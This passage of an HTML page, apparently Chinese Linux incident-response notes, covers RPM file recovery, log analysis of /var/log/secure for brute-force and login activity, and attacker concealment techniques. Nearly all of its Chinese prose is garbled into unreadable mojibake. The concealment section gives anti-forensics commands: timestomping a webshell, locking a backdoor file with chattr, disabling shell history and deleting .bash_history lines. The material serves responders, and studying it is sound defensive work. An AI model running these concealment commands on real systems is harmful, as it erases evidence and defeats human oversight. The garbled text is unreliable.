æ–‡ä»¶è·¯å¾„æ˜¯å¦æ”¹å˜</span><br><span class="line">        U         æ–‡ä»¶çš„å±ä¸»ï¼ˆæ‰€æœ‰è€…ï¼‰æ˜¯å¦æ”¹å˜</span><br><span class="line">        G         æ–‡ä»¶çš„å±ç»„æ˜¯å¦æ”¹å˜</span><br><span class="line">        T         æ–‡ä»¶çš„ä¿®æ”¹æ—¶é—´æ˜¯å¦æ”¹å˜</span><br></pre></td></tr></table></figure><p>å¦‚æœå‘½ä»¤è¢«æ›¿æ¢äº†ï¼Œå¦‚æœè¿˜åŸå›æ¥ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">æ–‡ä»¶æå–è¿˜åŸæ¡ˆä¾‹ï¼š</span><br><span class="line">rpm  -qf &#x2F;bin&#x2F;ls  æŸ¥è¯¢lså‘½ä»¤å±äºå“ªä¸ªè½¯ä»¶åŒ…</span><br><span class="line">mv  &#x2F;bin&#x2F;ls &#x2F;tmp  å…ˆæŠŠlsè½¬ç§»åˆ°tmpç›®å½•ä¸‹ï¼Œé€ æˆlså‘½ä»¤ä¸¢å¤±çš„å‡è±¡</span><br><span class="line">rpm2cpio &#x2F;mnt&#x2F;cdrom&#x2F;Packages&#x2F;coreutils-8.4-19.el6.i686.rpm | cpio -idv .&#x2F;bin&#x2F;ls æå–rpmåŒ…ä¸­lså‘½ä»¤åˆ°å½“å‰ç›®å½•çš„&#x2F;bin&#x2F;lsä¸‹</span><br><span class="line">cp &#x2F;root&#x2F;bin&#x2F;ls  &#x2F;bin&#x2F; æŠŠlså‘½ä»¤å¤åˆ¶åˆ°&#x2F;bin&#x2F;ç›®å½• ä¿®å¤æ–‡ä»¶ä¸¢å¤±</span><br></pre></td></tr></table></figure><h4 id="2-5-linuxå®‰å…¨æ£€æŸ¥è„šæœ¬"><a href="#2-5-linuxå®‰å…¨æ£€æŸ¥è„šæœ¬" class="headerlink" title="2.5 linuxå®‰å…¨æ£€æŸ¥è„šæœ¬"></a>2.5 linuxå®‰å…¨æ£€æŸ¥è„šæœ¬</h4><p>Githubé¡¹ç›®åœ°å€ï¼š</p><p><a href="https://github.com/grayddq/GScan">https://github.com/grayddq/GScan</a></p><p><a href="https://github.com/ppabc/security_check">https://github.com/ppabc/security_check</a></p><p><a href="https://github.com/T0xst/linux">https://github.com/T0xst/linux</a></p><p><strong>å°½ä¿¡ä¹¦ä¸å¦‚æ— ä¹¦ï¼Œå·¥å…·åªæ˜¯è¾…åŠ©ï¼Œåˆ«å¤ªè¿‡äºä¾èµ–ï¼Œå…³é”®åœ¨äºä½ å¦‚ä½•è§£å†³é—®é¢˜çš„æ€è·¯ã€‚</strong></p><h1 id="Linux-æ—¥å¿—åˆ†æ"><a href="#Linux-æ—¥å¿—åˆ†æ" class="headerlink" title="Linux æ—¥å¿—åˆ†æ"></a>Linux æ—¥å¿—åˆ†æ</h1><h3 id="0x00-å‰è¨€-1"><a href="#0x00-å‰è¨€-1" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h3><p>Linuxç³»ç»Ÿæ‹¥æœ‰éå¸¸çµæ´»å’Œå¼ºå¤§çš„æ—¥å¿—åŠŸèƒ½ï¼Œå¯ä»¥ä¿å­˜å‡ ä¹æ‰€æœ‰çš„æ“ä½œè®°å½•ï¼Œå¹¶å¯ä»¥ä»ä¸­æ£€ç´¢å‡ºæˆ‘ä»¬éœ€è¦çš„ä¿¡æ¯ã€‚ æœ¬æ–‡ç®€ä»‹ä¸€ä¸‹Linuxç³»ç»Ÿæ—¥å¿—åŠæ—¥å¿—åˆ†ææŠ€å·§ã€‚</p><h3 id="0x01-æ—¥å¿—ç®€ä»‹"><a href="#0x01-æ—¥å¿—ç®€ä»‹" class="headerlink" title="0x01 æ—¥å¿—ç®€ä»‹"></a>0x01 æ—¥å¿—ç®€ä»‹</h3><p>æ—¥å¿—é»˜è®¤å­˜æ”¾ä½ç½®ï¼š/var/log/</p><p>æŸ¥çœ‹æ—¥å¿—é…ç½®æƒ…å†µï¼šmore /etc/rsyslog.conf</p><table><thead><tr><th align="center">æ—¥å¿—æ–‡ä»¶</th><th align="center">è¯´æ˜</th></tr></thead><tbody><tr><td align="center">/var/log/cron</td><td align="center">è®°å½•äº†ç³»ç»Ÿå®šæ—¶ä»»åŠ¡ç›¸å…³çš„æ—¥å¿—</td></tr><tr><td align="center">/var/log/cups</td><td align="center">è®°å½•æ‰“å°ä¿¡æ¯çš„æ—¥å¿—</td></tr><tr><td align="center">/var/log/dmesg</td><td align="center">è®°å½•äº†ç³»ç»Ÿåœ¨å¼€æœºæ—¶å†…æ ¸è‡ªæ£€çš„ä¿¡æ¯ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨dmesgå‘½ä»¤ç›´æ¥æŸ¥çœ‹å†…æ ¸è‡ªæ£€ä¿¡æ¯</td></tr><tr><td align="center">/var/log/mailog</td><td align="center">è®°å½•é‚®ä»¶ä¿¡æ¯</td></tr><tr><td align="center">/var/log/message</td><td align="center">è®°å½•ç³»ç»Ÿé‡è¦ä¿¡æ¯çš„æ—¥å¿—ã€‚è¿™ä¸ªæ—¥å¿—æ–‡ä»¶ä¸­ä¼šè®°å½•Linuxç³»ç»Ÿçš„ç»å¤§å¤šæ•°é‡è¦ä¿¡æ¯ï¼Œå¦‚æœç³»ç»Ÿå‡ºç°é—®é¢˜æ—¶ï¼Œé¦–å…ˆè¦æ£€æŸ¥çš„å°±åº”è¯¥æ˜¯è¿™ä¸ªæ—¥å¿—æ–‡ä»¶</td></tr><tr><td align="center">/var/log/btmp</td><td align="center">è®°å½•é”™è¯¯ç™»å½•æ—¥å¿—ï¼Œè¿™ä¸ªæ–‡ä»¶æ˜¯äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä¸èƒ½ç›´æ¥viæŸ¥çœ‹ï¼Œè€Œè¦ä½¿ç”¨lastbå‘½ä»¤æŸ¥çœ‹</td></tr><tr><td align="center">/var/log/lastlog</td><td align="center">è®°å½•ç³»ç»Ÿä¸­æ‰€æœ‰ç”¨æˆ·æœ€åä¸€æ¬¡ç™»å½•æ—¶é—´çš„æ—¥å¿—ï¼Œè¿™ä¸ªæ–‡ä»¶æ˜¯äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä¸èƒ½ç›´æ¥viï¼Œè€Œè¦ä½¿ç”¨lastlogå‘½ä»¤æŸ¥çœ‹</td></tr><tr><td align="center">/var/log/wtmp</td><td align="center">æ°¸ä¹…è®°å½•æ‰€æœ‰ç”¨æˆ·çš„ç™»å½•ã€æ³¨é”€ä¿¡æ¯ï¼ŒåŒæ—¶è®°å½•ç³»ç»Ÿçš„å¯åŠ¨ã€é‡å¯ã€å…³æœºäº‹ä»¶ã€‚åŒæ ·è¿™ä¸ªæ–‡ä»¶ä¹Ÿæ˜¯ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä¸èƒ½ç›´æ¥viï¼Œè€Œéœ€è¦ä½¿ç”¨lastå‘½ä»¤æ¥æŸ¥çœ‹</td></tr><tr><td align="center">/var/log/utmp</td><td align="center">è®°å½•å½“å‰å·²ç»ç™»å½•çš„ç”¨æˆ·ä¿¡æ¯ï¼Œè¿™ä¸ªæ–‡ä»¶ä¼šéšç€ç”¨æˆ·çš„ç™»å½•å’Œæ³¨é”€ä¸æ–­å˜åŒ–ï¼Œåªè®°å½•å½“å‰ç™»å½•ç”¨æˆ·çš„ä¿¡æ¯ã€‚åŒæ ·è¿™ä¸ªæ–‡ä»¶ä¸èƒ½ç›´æ¥viï¼Œè€Œè¦ä½¿ç”¨w,who,usersç­‰å‘½ä»¤æ¥æŸ¥è¯¢</td></tr><tr><td align="center">/var/log/secure</td><td align="center">è®°å½•éªŒè¯å’Œæˆæƒæ–¹é¢çš„ä¿¡æ¯ï¼Œåªè¦æ¶‰åŠè´¦å·å’Œå¯†ç çš„ç¨‹åºéƒ½ä¼šè®°å½•ï¼Œæ¯”å¦‚SSHç™»å½•ï¼Œsuåˆ‡æ¢ç”¨æˆ·ï¼Œsudoæˆæƒï¼Œç”šè‡³æ·»åŠ ç”¨æˆ·å’Œä¿®æ”¹ç”¨æˆ·å¯†ç éƒ½ä¼šè®°å½•åœ¨è¿™ä¸ªæ—¥å¿—æ–‡ä»¶ä¸­</td></tr></tbody></table><p>æ¯”è¾ƒé‡è¦çš„å‡ ä¸ªæ—¥å¿—ï¼š ç™»å½•å¤±è´¥è®°å½•ï¼š/var/log/btmp //lastb æœ€åä¸€æ¬¡ç™»å½•ï¼š/var/log/lastlog //lastlog ç™»å½•æˆåŠŸè®°å½•: /var/log/wtmp //last ç™»å½•æ—¥å¿—è®°å½•ï¼š/var/log/secure</p><p> ç›®å‰ç™»å½•ç”¨æˆ·ä¿¡æ¯ï¼š/var/run/utmp //wã€whoã€users</p><p> å†å²å‘½ä»¤è®°å½•ï¼šhistory ä»…æ¸…ç†å½“å‰ç”¨æˆ·ï¼š history -c</p><h3 id="0x02-æ—¥å¿—åˆ†ææŠ€å·§"><a href="#0x02-æ—¥å¿—åˆ†ææŠ€å·§" class="headerlink" title="0x02 æ—¥å¿—åˆ†ææŠ€å·§"></a>0x02 æ—¥å¿—åˆ†ææŠ€å·§</h3><h4 id="Aã€å¸¸ç”¨çš„shellå‘½ä»¤"><a href="#Aã€å¸¸ç”¨çš„shellå‘½ä»¤" class="headerlink" title="Aã€å¸¸ç”¨çš„shellå‘½ä»¤"></a>Aã€å¸¸ç”¨çš„shellå‘½ä»¤</h4><p>Linuxä¸‹å¸¸ç”¨çš„shellå‘½ä»¤å¦‚ï¼šfindã€grep ã€egrepã€awkã€sed</p><p>å°æŠ€å·§ï¼š</p><p>1ã€grepæ˜¾ç¤ºå‰åå‡ è¡Œä¿¡æ¯:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">æ ‡å‡†unix&#x2F;linuxä¸‹çš„grepé€šè¿‡ä¸‹é¢åƒæ•°æ§åˆ¶ä¸Šä¸‹æ–‡ï¼š</span><br><span class="line">grep -C 5 foo file æ˜¾ç¤ºfileæ–‡ä»¶é‡ŒåŒ¹é…fooå­—ä¸²é‚£è¡Œä»¥åŠä¸Šä¸‹5è¡Œ</span><br><span class="line">grep -B 5 foo file æ˜¾ç¤ºfooåŠå‰5è¡Œ</span><br><span class="line">grep -A 5 foo file æ˜¾ç¤ºfooåŠå5è¡Œ</span><br><span class="line">æŸ¥çœ‹grepç‰ˆæœ¬å·çš„æ–¹æ³•æ˜¯</span><br><span class="line">grep -V</span><br></pre></td></tr></table></figure><p>2ã€grep æŸ¥æ‰¾å«æœ‰æŸå­—ç¬¦ä¸²çš„æ‰€æœ‰æ–‡ä»¶</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">grep -rn &quot;hello,world!&quot; </span><br><span class="line">* : è¡¨ç¤ºå½“å‰ç›®å½•æ‰€æœ‰æ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥æ˜¯æŸä¸ªæ–‡ä»¶å</span><br><span class="line">-r æ˜¯é€’å½’æŸ¥æ‰¾</span><br><span class="line">-n æ˜¯æ˜¾ç¤ºè¡Œå·</span><br><span class="line">-R æŸ¥æ‰¾æ‰€æœ‰æ–‡ä»¶åŒ…å«å­ç›®å½•</span><br><span class="line">-i å¿½ç•¥å¤§å°å†™</span><br></pre></td></tr></table></figure><p>3ã€å¦‚ä½•æ˜¾ç¤ºä¸€ä¸ªæ–‡ä»¶çš„æŸå‡ è¡Œï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat input_file | tail -n +1000 | head -n 2000</span><br><span class="line">#ä»ç¬¬1000è¡Œå¼€å§‹ï¼Œæ˜¾ç¤º2000è¡Œã€‚å³æ˜¾ç¤º1000~2999è¡Œ</span><br></pre></td></tr></table></figure><p>4ã€find /etc -name init</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;åœ¨ç›®å½•&#x2F;etcä¸­æŸ¥æ‰¾æ–‡ä»¶init</span><br></pre></td></tr></table></figure><p>5ã€åªæ˜¯æ˜¾ç¤º/etc/passwdçš„è´¦æˆ·</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#96;cat &#x2F;etc&#x2F;passwd |awk  -F &#39;:&#39;  &#39;&#123;print $1&#125;&#39;&#96;  </span><br><span class="line">&#x2F;&#x2F;awk -FæŒ‡å®šåŸŸåˆ†éš”ç¬¦ä¸º&#39;:&#39;ï¼Œå°†è®°å½•æŒ‰æŒ‡å®šçš„åŸŸåˆ†éš”ç¬¦åˆ’åˆ†åŸŸï¼Œå¡«å……åŸŸï¼Œ$0åˆ™è¡¨ç¤ºæ‰€æœ‰åŸŸ,$1è¡¨ç¤ºç¬¬ä¸€ä¸ªåŸŸ,$nè¡¨ç¤ºç¬¬nä¸ªåŸŸã€‚</span><br></pre></td></tr></table></figure><p>6ã€sed -i â€˜153,$dâ€™ .bash_history</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">åˆ é™¤å†å²æ“ä½œè®°å½•ï¼Œåªä¿ç•™å‰153è¡Œ</span><br></pre></td></tr></table></figure><h4 id="Bã€æ—¥å¿—åˆ†ææŠ€å·§"><a href="#Bã€æ—¥å¿—åˆ†ææŠ€å·§" class="headerlink" title="Bã€æ—¥å¿—åˆ†ææŠ€å·§"></a>Bã€æ—¥å¿—åˆ†ææŠ€å·§</h4><p><strong>Aã€/var/log/secure</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">1ã€å®šä½æœ‰å¤šå°‘IPåœ¨çˆ†ç ´ä¸»æœºçš„rootå¸å·ï¼š    </span><br><span class="line">grep &quot;Failed password for root&quot; &#x2F;var&#x2F;log&#x2F;secure | awk &#39;&#123;print $11&#125;&#39; | sort | uniq -c | sort -nr | more</span><br><span class="line"></span><br><span class="line">å®šä½æœ‰å“ªäº›IPåœ¨çˆ†ç ´ï¼š</span><br><span class="line">grep &quot;Failed password&quot; &#x2F;var&#x2F;log&#x2F;secure|grep -E -o &quot;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)&quot;|uniq -c</span><br><span class="line"></span><br><span class="line">çˆ†ç ´ç”¨æˆ·åå­—å…¸æ˜¯ä»€ä¹ˆï¼Ÿ</span><br><span class="line"> grep &quot;Failed password&quot; &#x2F;var&#x2F;log&#x2F;secure|perl -e &#39;while($_&#x3D;&lt;&gt;)&#123; &#x2F;for(.*?) from&#x2F;; print &quot;$1\n&quot;;&#125;&#39;|uniq -c|sort -nr</span><br><span class="line"></span><br><span class="line">2ã€ç™»å½•æˆåŠŸçš„IPæœ‰å“ªäº›ï¼š     </span><br><span class="line">grep &quot;Accepted &quot; &#x2F;var&#x2F;log&#x2F;secure | awk &#39;&#123;print $11&#125;&#39; | sort | uniq -c | sort -nr | more</span><br><span class="line"></span><br><span class="line">ç™»å½•æˆåŠŸçš„æ—¥æœŸã€ç”¨æˆ·åã€IPï¼š</span><br><span class="line">grep &quot;Accepted &quot; &#x2F;var&#x2F;log&#x2F;secure | awk &#39;&#123;print $1,$2,$3,$9,$11&#125;&#39; </span><br><span class="line"></span><br><span class="line">3ã€å¢åŠ ä¸€ä¸ªç”¨æˆ·kaliæ—¥å¿—ï¼š</span><br><span class="line">Jul 10 00:12:15 localhost useradd[2382]: new group: name&#x3D;kali, GID&#x3D;1001</span><br><span class="line">Jul 10 00:12:15 localhost useradd[2382]: new user: name&#x3D;kali, UID&#x3D;1001, GID&#x3D;1001, home&#x3D;&#x2F;home&#x2F;kali</span><br><span class="line">, shell&#x3D;&#x2F;bin&#x2F;bash</span><br><span class="line">Jul 10 00:12:58 localhost passwd: pam_unix(passwd:chauthtok): password changed for kali</span><br><span class="line">#grep &quot;useradd&quot; &#x2F;var&#x2F;log&#x2F;secure </span><br><span class="line"></span><br><span class="line">4ã€åˆ é™¤ç”¨æˆ·kaliæ—¥å¿—ï¼š</span><br><span class="line">Jul 10 00:14:17 localhost userdel[2393]: delete user &#39;kali&#39;</span><br><span class="line">Jul 10 00:14:17 localhost userdel[2393]: removed group &#39;kali&#39; owned by &#39;kali&#39;</span><br><span class="line">Jul 10 00:14:17 localhost userdel[2393]: removed shadow group &#39;kali&#39; owned by &#39;kali&#39;</span><br><span class="line"># grep &quot;userdel&quot; &#x2F;var&#x2F;log&#x2F;secure</span><br><span class="line"></span><br><span class="line">5ã€suåˆ‡æ¢ç”¨æˆ·ï¼š</span><br><span class="line">Jul 10 00:38:13 localhost su: pam_unix(su-l:session): session opened for user good by root(uid&#x3D;0)</span><br><span class="line"></span><br><span class="line">sudoæˆæƒæ‰§è¡Œ:</span><br><span class="line">sudo -l</span><br><span class="line">Jul 10 00:43:09 localhost sudo:    good : TTY&#x3D;pts&#x2F;4 ; PWD&#x3D;&#x2F;home&#x2F;good ; USER&#x3D;root ; COMMAND&#x3D;&#x2F;sbin&#x2F;shutdown -r now</span><br></pre></td></tr></table></figure><p><strong>2ã€/var/log/yum.log</strong></p><p>è½¯ä»¶å®‰è£…å‡çº§å¸è½½æ—¥å¿—ï¼š</p><p>~~~yum install gcc yum install gcc</p><p>[root@bogon ~]# more /var/log/yum.log</p><p>Jul 10 00:18:23 Updated: cpp-4.8.5-28.el7_5.1.x86_64 Jul 10 00:18:24 Updated: libgcc-4.8.5-28.el7_5.1.x86_64 Jul 10 00:18:24 Updated: libgomp-4.8.5-28.el7_5.1.x86_64 Jul 10 00:18:28 Updated: gcc-4.8.5-28.el7_5.1.x86_64 Jul 10 00:18:28 Updated: libgcc-4.8.5-28.el7_5.1.i686 <del>~</del></p><h1 id="Linux-æƒé™ç»´æŒ"><a href="#Linux-æƒé™ç»´æŒ" class="headerlink" title="Linux æƒé™ç»´æŒ"></a>Linux æƒé™ç»´æŒ</h1><h2 id="éšè—ç¯‡"><a href="#éšè—ç¯‡" class="headerlink" title="éšè—ç¯‡"></a>éšè—ç¯‡</h2><h3 id="0x00-å‰è¨€-2"><a href="#0x00-å‰è¨€-2" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h3><p>æ”»å‡»è€…åœ¨è·å–æœåŠ¡å™¨æƒé™åï¼Œä¼šé€šè¿‡ä¸€äº›æŠ€å·§æ¥éšè—è‡ªå·±çš„è¸ªè¿¹å’Œåé—¨æ–‡ä»¶ï¼Œæœ¬æ–‡ä»‹ç»Linuxä¸‹çš„å‡ ç§éšè—æŠ€æœ¯ã€‚</p><h3 id="0x01-éšè—æ–‡ä»¶"><a href="#0x01-éšè—æ–‡ä»¶" class="headerlink" title="0x01 éšè—æ–‡ä»¶"></a>0x01 éšè—æ–‡ä»¶</h3><p>Linux ä¸‹åˆ›å»ºä¸€ä¸ªéšè—æ–‡ä»¶ï¼š<code>touch .test.txt</code></p><p>touch å‘½ä»¤å¯ä»¥åˆ›å»ºä¸€ä¸ªæ–‡ä»¶ï¼Œæ–‡ä»¶åå‰é¢åŠ ä¸€ä¸ª ç‚¹ å°±ä»£è¡¨æ˜¯éšè—æ–‡ä»¶,å¦‚ä¸‹å›¾ï¼š</p><p><img src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-2-1.png"></p><p>ä¸€èˆ¬çš„Linuxä¸‹çš„éšè—ç›®å½•ä½¿ç”¨å‘½ä»¤<code>ls -l</code>æ˜¯æŸ¥çœ‹ä¸å‡ºæ¥çš„ï¼Œåªèƒ½æŸ¥çœ‹åˆ°æ–‡ä»¶åŠæ–‡ä»¶å¤¹ï¼ŒæŸ¥çœ‹Linuxä¸‹çš„éšè—æ–‡ä»¶éœ€è¦ç”¨åˆ°å‘½ä»¤ï¼š<code>ls -al</code></p><p>è¿™é‡Œï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°åœ¨/tmpä¸‹ï¼Œé»˜è®¤å­˜åœ¨å¤šä¸ªéšè—ç›®å½•ï¼Œè¿™äº›ç›®å½•æ˜¯æ¶æ„æ–‡ä»¶å¸¸ç”¨æ¥è—èº«çš„åœ°æ–¹ã€‚å¦‚<code>/temp/.ICE-unix/ã€/temp/.Test-unix/ã€/temp/.X11-unix/ã€/temp/.XIM-unix/</code></p><h3 id="0x02-éšè—æ–‡ä»¶æ—¶é—´æˆ³"><a href="#0x02-éšè—æ–‡ä»¶æ—¶é—´æˆ³" class="headerlink" title="0x02 éšè—æ–‡ä»¶æ—¶é—´æˆ³"></a>0x02 éšè—æ–‡ä»¶æ—¶é—´æˆ³</h3><p>Unix ä¸‹è—åé—¨å¿…é¡»è¦ä¿®æ”¹æ—¶é—´ï¼Œå¦åˆ™å¾ˆå®¹æ˜“è¢«å‘ç°ï¼Œç›´æ¥åˆ©ç”¨ touch å°±å¯ä»¥äº†ã€‚</p><p>æ¯”å¦‚å‚è€ƒ index.php çš„æ—¶é—´ï¼Œå†èµ‹ç»™ webshell.phpï¼Œç»“æœä¸¤ä¸ªæ–‡ä»¶çš„æ—¶é—´å°±ä¸€æ ·äº†ã€‚</p><p>åˆ©ç”¨æ–¹æ³•</p><p>touch -r index.php webshell.php</p><p>æˆ–è€…ç›´æ¥å°†æ—¶é—´æˆ³ä¿®æ”¹æˆæŸå¹´æŸæœˆæŸæ—¥ã€‚å¦‚ä¸‹ 2014 å¹´ 01 æœˆ 02 æ—¥ã€‚</p><p>touch -t 1401021042.30 webshell.php</p><h3 id="0x03-éšè—æƒé™"><a href="#0x03-éšè—æƒé™" class="headerlink" title="0x03 éšè—æƒé™"></a>0x03 éšè—æƒé™</h3><p>åœ¨Linuxä¸­ï¼Œä½¿ç”¨chattrå‘½ä»¤æ¥é˜²æ­¢rootå’Œå…¶ä»–ç®¡ç†ç”¨æˆ·è¯¯åˆ é™¤å’Œä¿®æ”¹é‡è¦æ–‡ä»¶åŠç›®å½•ï¼Œæ­¤æƒé™ç”¨ls -læ˜¯æŸ¥çœ‹ä¸å‡ºæ¥çš„ï¼Œä»è€Œè¾¾åˆ°éšè—æƒé™çš„ç›®çš„ã€‚</p><p>è¿™ä¸ªæŠ€å·§å¸¸è¢«ç”¨åœ¨åé—¨ï¼Œå˜æˆäº†ä¸€äº›éš¾ä»¥æ¸…é™¤çš„åé—¨æ–‡ä»¶ï¼Œä»¤å¾ˆå¤šæ–°æ‰‹æœ‹å‹æ„Ÿåˆ°å¤´ç–¼ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">chattr +i evil.php é”å®šæ–‡ä»¶</span><br><span class="line">lsattr  evil.php   å±æ€§æŸ¥çœ‹</span><br><span class="line">chattr -i evil.php è§£é™¤é”å®š</span><br><span class="line">rm -rf 1.evil.php  åˆ é™¤æ–‡ä»¶</span><br></pre></td></tr></table></figure><p><img src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-2-2.png"></p><p>ä¸ä¼šå§ã€‚ä¸ä¼šçœŸæœ‰äººæŒ‚ç§‘å§ã€‚</p><p><img src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-2-2.png"></p><h3 id="0x04-éšè—å†å²æ“ä½œå‘½ä»¤"><a href="#0x04-éšè—å†å²æ“ä½œå‘½ä»¤" class="headerlink" title="0x04 éšè—å†å²æ“ä½œå‘½ä»¤"></a>0x04 éšè—å†å²æ“ä½œå‘½ä»¤</h3><p>åœ¨shellä¸­æ‰§è¡Œçš„å‘½ä»¤ï¼Œä¸å¸Œæœ›è¢«è®°å½•åœ¨å‘½ä»¤è¡Œå†å²ä¸­ï¼Œå¦‚ä½•åœ¨linuxä¸­å¼€å¯æ— ç—•æ“ä½œæ¨¡å¼å‘¢ï¼Ÿ</p><p>æŠ€å·§ä¸€ï¼šåªé’ˆå¯¹ä½ çš„å·¥ä½œå…³é—­å†å²è®°å½•</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[space]set +o history</span><br><span class="line">å¤‡æ³¨ï¼š[space] è¡¨ç¤ºç©ºæ ¼ã€‚å¹¶ä¸”ç”±äºç©ºæ ¼çš„ç¼˜æ•…ï¼Œè¯¥å‘½ä»¤æœ¬èº«ä¹Ÿä¸ä¼šè¢«è®°å½•ã€‚</span><br></pre></td></tr></table></figure><p>ä¸Šé¢çš„å‘½ä»¤ä¼šä¸´æ—¶ç¦ç”¨å†å²åŠŸèƒ½ï¼Œè¿™æ„å‘³ç€åœ¨è¿™å‘½ä»¤ä¹‹åä½ æ‰§è¡Œçš„æ‰€æœ‰æ“ä½œéƒ½ä¸ä¼šè®°å½•åˆ°å†å²ä¸­ï¼Œç„¶è€Œè¿™ä¸ªå‘½ä»¤ä¹‹å‰çš„æ‰€æœ‰ä¸œè¥¿éƒ½ä¼šåŸæ ·è®°å½•åœ¨å†å²åˆ—è¡¨ä¸­ã€‚</p><p>è¦é‡æ–°å¼€å¯å†å²åŠŸèƒ½ï¼Œæ‰§è¡Œä¸‹é¢çš„å‘½ä»¤ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[Space]set -o history</span><br><span class="line">å®ƒå°†ç¯å¢ƒæ¢å¤åŸçŠ¶ï¼Œä¹Ÿå°±æ˜¯ä½ å®Œæˆäº†ä½ çš„å·¥ä½œï¼Œæ‰§è¡Œä¸Šè¿°å‘½ä»¤ä¹‹åçš„å‘½ä»¤éƒ½ä¼šå‡ºç°åœ¨å†å²ä¸­ã€‚</span><br></pre></td></tr></table></figure><p>æŠ€å·§äºŒï¼šä»å†å²è®°å½•ä¸­åˆ é™¤æŒ‡å®šçš„å‘½ä»¤</p><p>å‡è®¾å†å²è®°å½•ä¸­å·²ç»åŒ…å«äº†ä¸€äº›ä½ ä¸å¸Œæœ›è®°å½•çš„å‘½ä»¤ã€‚è¿™ç§æƒ…å†µä¸‹æˆ‘ä»¬æ€ä¹ˆåŠï¼Ÿå¾ˆç®€å•ã€‚é€šè¿‡ä¸‹é¢çš„å‘½ä»¤æ¥åˆ é™¤ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">history | grep &quot;keyword&quot;</span><br></pre></td></tr></table></figure><p>è¾“å‡ºå†å²è®°å½•ä¸­åŒ¹é…çš„å‘½ä»¤ï¼Œæ¯ä¸€æ¡å‰é¢ä¼šæœ‰ä¸ªæ•°å­—ã€‚ä»å†å²è®°å½•ä¸­åˆ é™¤é‚£ä¸ªæŒ‡å®šçš„é¡¹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">history -d [num]</span><br></pre></td></tr></table></figure><p><img src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-2-3.png"></p><p>è¿™ç§æŠ€å·§æ˜¯å…³é”®è®°å½•åˆ é™¤ï¼Œæˆ–è€…æˆ‘ä»¬å¯ä»¥æš´åŠ›ç‚¹ï¼Œæ¯”å¦‚å‰150è¡Œæ˜¯ç”¨æˆ·çš„æ­£å¸¸æ“ä½œè®°å½•ï¼Œ150ä»¥åæ˜¯æ”»å‡»è€…æ“ä½œè®°å½•ã€‚æˆ‘ä»¬å¯ä»¥åªä¿ç•™æ­£å¸¸çš„æ“ä½œï¼Œåˆ é™¤æ”»å‡»ç—•è¿¹çš„å†å²æ“ä½œè®°å½•ï¼Œè¿™é‡Œï¼Œæˆ‘ä»¬åªä¿ç•™å‰150è¡Œï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -i &#39;150,$d&#39; .bash_history</span><br></pre></td></tr></table></figure><h3 id="0x05-éšè—è¿œç¨‹SSHç™»é™†è®°å½•"><a href="#0x05-éšè—è¿œç¨‹SSHç™»é™†è®°å½•" class="headerlink" title="0x05 éšè—è¿œç¨‹SSHç™»é™†è®°å½•"></a>0x05 